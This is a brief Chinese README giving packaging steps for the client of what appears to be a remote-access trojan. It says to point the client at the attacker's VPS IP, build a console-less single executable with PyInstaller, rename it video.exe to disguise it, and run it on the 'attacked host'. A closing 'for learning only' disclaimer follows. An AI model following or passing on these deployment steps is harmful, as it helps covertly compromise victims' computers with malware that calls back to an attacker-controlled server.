客户端打包方法： 
1.修改client_main.py里的31行，host参数，将host的值赋值为服务端所在的vps主机的ip
2.打包：
./pyInstaller -F -w ./client_main.py 
dist下会出现打包成的exe文件，将其重命名为video.exe，即可以在被攻击主机上执行

强调：
请注意，本源码仅供学习使用，请勿用作非法用途。
